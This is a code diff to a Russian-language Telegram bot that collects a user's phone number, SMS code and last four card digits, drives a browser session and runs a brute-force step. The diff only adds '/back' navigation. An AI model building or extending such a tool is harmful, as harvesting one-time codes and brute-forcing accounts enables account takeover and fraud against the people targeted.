@@ -424,7 +424,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_sessions[user_id] = session
     
     await update.message.reply_text(
-        "👋 Добро пожаловать! Отправьте номер телефона в формате +79999999999"
+        "👋 Добро пожаловать! Отправьте номер телефона в формате +79999999999\n\n"
+        "⬅️ /back - вернуться назад\n"
+        "❌ /cancel - отменить"
     )
     return State.WAITING_PHONE.value
 
@@ -452,7 +454,8 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         if await enter_phone_number(session, context.application.bot):
             await update.message.reply_text(
                 "✅ Номер введен. Теперь отправьте SMS код, который пришел на телефон:\n\n"
-                "🔁 Если код не пришел, используйте /resend"
+                "🔁 /resend - отправить код повторно\n"
+                "⬅️ /back - вернуться назад"
             )
             session.state = State.WAITING_SMS
             return State.WAITING_SMS.value
@@ -488,7 +491,8 @@ async def receive_sms(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
     try:
         if await enter_sms_code(session, sms_code, context.application.bot):
             await update.message.reply_text(
-                "✅ Код принят. Теперь отправьте последние 4 цифры карты:"
+                "✅ Код принят. Теперь отправьте последние 4 цифры карты:\n\n"
+                "⬅️ /back - вернуться назад"
             )
             session.state = State.WAITING_LAST4
             return State.WAITING_LAST4.value
@@ -545,6 +549,28 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.message.reply_text("❌ Операция отменена.")
     return ConversationHandler.END
 
+async def back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Go back to previous step or restart"""
+    user_id = update.effective_user.id
+    
+    if user_id in user_sessions:
+        session = user_sessions[user_id]
+        session.stop_brute_force = True
+        
+        if session.driver:
+            try:
+                session.driver.quit()
+            except:
+                pass
+        
+        del user_sessions[user_id]
+    
+    await update.message.reply_text(
+        "⬅️ Возврат назад. Сессия сброшена.\n\n"
+        "👉 Нажмите /start чтобы начать заново."
+    )
+    return ConversationHandler.END
+
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle errors"""
     logger.error(f"Update {update} caused error {context.error}")
@@ -577,7 +603,10 @@ def main():
                 MessageHandler(filters.TEXT & ~filters.COMMAND, brute_force_status)
             ],
         },
-        fallbacks=[CommandHandler('cancel', cancel)],
+        fallbacks=[
+            CommandHandler('cancel', cancel),
+            CommandHandler('back', back),
+        ],
     )
     
     app.add_handler(conv_handler)
